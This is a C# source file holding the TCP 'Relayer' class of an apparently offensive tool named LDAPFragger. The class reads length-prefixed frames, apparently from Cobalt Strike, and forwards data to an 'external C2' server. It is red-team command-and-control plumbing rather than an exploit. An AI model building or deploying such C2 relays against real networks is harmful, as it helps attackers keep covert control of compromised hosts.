using System;
using System.Net.Sockets;

namespace LDAPFragger.Core.Transport
{
    class Relayer
    {        
        private TcpClient     TCPClient;
        private NetworkStream Stream;
        private string    SERVER_IP;
        private int       SERVER_PORT;

        private const int MaxBufferSize = 1024 * 1024;

        public bool IsConnected { get { return TCPClient.Connected; } }


        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="server"></param>
        /// <param name="port"></param>
        public Relayer(string server, int port)
        {
            this.SERVER_IP   = server;
            this.SERVER_PORT = port;

            TCPClient = new TcpClient();

            // TODO: handle exception
            // Unhandled Exception: System.Net.Sockets.SocketException: No connection could be made because the target machine actively refused it 192.168.32.199:2222
            //A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond 192.168.32.199:2222
            TCPClient.Connect(SERVER_IP, SERVER_PORT);
            Stream = TCPClient.GetStream();
        }

        /// <summary>
        ///     Read a frame from the socket
        /// </summary>
        /// <returns>The frame bytes</returns>
        public byte[] ReadFrame()
        {
            try
            {
                //var next = Stream.ReadByte();
                //if (next < 0)
                //    return null;
              
                // Receive first 3 bytes to determine the length of the stream
                byte[] msgLength = new byte[4];
                //byte[] _msgLength = new byte[3];
                //msgLength[0] = Convert.ToByte(next);
                //msgLength[1] = _msgLength[0];
                //msgLength[2] = _msgLength[1];
                //msgLength[3] = _msgLength[2];

                // frames sent by CS are 4 bytes at minimum
                Stream.Read(msgLength, 0, 4);
                if (msgLength.Length < 4)
                    return null;

                // Calc complete message size
                var size = BitConverter.ToInt32(msgLength, 0) > MaxBufferSize
                    ? MaxBufferSize
                    : BitConverter.ToInt32(msgLength, 0);

                var total = 0;
                var bytesReceived = new byte[size];
                while (total < size)
                {
                    var _bytes = Stream.Read(bytesReceived, total, (size - total));
                    total += _bytes;
                }

                return bytesReceived;
                
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception while reading socket: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Sends data to external C2
        /// </summary>
        /// <param name="Data"></param>
        public void Send(byte[] Data)
        {
            // Add length of the byte array to
            byte[] dataLen = Misc.convertToLE(Data.Length);
            byte[] toSend  = Misc.Combine(dataLen, Data);

            if (!TCPClient.Connected)
            {
                try
                {
                    TCPClient.Connect(SERVER_IP, SERVER_PORT);
                }
                catch (Exception ex)
                {
                    // Not sure what to do right now
                    Console.WriteLine("[-] Cannot send frame. Cannot connect to TCP client.");
                    Console.WriteLine("[-] Exception: {0}", ex.Message);
                    return;
                }
            }

            //var stream = TCPClient.GetStream();
            Stream.Write(toSend, 0, toSend.Length);
            //stream.Close();
        }


        public void Dispose()
        {
            // cleanup
            Stream.Flush();
            Stream.Close();
            Stream.Dispose();
            TCPClient.Close();            
        }

      

    }
}
